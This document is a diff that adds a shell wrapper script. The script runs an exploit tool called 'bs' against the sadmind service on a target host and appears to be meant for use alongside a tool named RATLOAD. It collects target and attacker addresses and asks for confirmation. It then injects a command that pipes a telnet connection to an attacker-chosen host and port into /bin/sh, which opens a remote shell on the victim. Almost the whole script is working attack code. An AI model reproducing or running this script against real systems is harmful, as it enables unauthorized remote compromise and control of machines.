@@ -1,0 +1,68 @@
+#!/bin/sh
+#
+# Use BS with RATLOAD
+#
+
+  usage()
+    {
+    echo ""
+    echo "This script requires RATLOAD"
+    echo "Usage: ${0} remoteIP remoteHost [remoteDomain] \\"
+    echo "  sadmindPort localIP ratloadPort"
+    exit 1
+    }
+
+REMOTE_IP="-i ${1}"
+REMOTE_HOST="-h ${2}"
+case ${#} in
+  5)
+    SADMIND_PORT="-p ${3}"
+    LOCAL_IP="${4}"
+    LOCAL_PORT="${5}"
+    ;;
+  6)
+    REMOTE_DOMAIN="-d ${3}"
+    SADMIND_PORT="-p ${4}"
+    LOCAL_IP="${5}"
+    LOCAL_PORT="${6}"
+    ;;
+  *)
+    usage
+    ;;
+esac
+
+# Check for required args
+[ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+[ -z "$REMOTE_HOST" ] && echo "Error: missing remote hostname" && usage
+[ -z "$SADMIND_PORT" ] && echo "Error: missing remote hostname" && usage
+[ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+[ -z "$LOCAL_PORT" ] && echo "Error: missing local port" && usage
+
+
+echo "--> my IP is $LOCAL_IP"
+echo "--> port to telnet to is $LOCAL_PORT"
+echo "--> exploiting sadmind on \"$SADMIND_PORT\""
+echo "--> target hostname \"$REMOTE_HOST\""
+[ ! -z "$REMOTE_DOMAIN" ] && echo "--> using domain \"$REMOTE_DOMAIN\""
+
+echo "
+about to run: 
+
+bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
+  -c \"/bin/telnet ${LOCAL_IP} ${LOCAL_PORT} < /dev/console | /bin/sh\"
+
+"
+PLATFORM=`uname`
+
+if [ "$PLATFORM" = "Linux" ]; then
+  MINUSN=-n
+else
+  MINUSN=""
+fi
+echo $MINUSN "Hit enter to proceed, ^C to not: "
+
+read junk
+
+bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
+  -c "/bin/telnet ${LOCAL_IP} ${LOCAL_PORT} < /dev/console | /bin/sh"
+
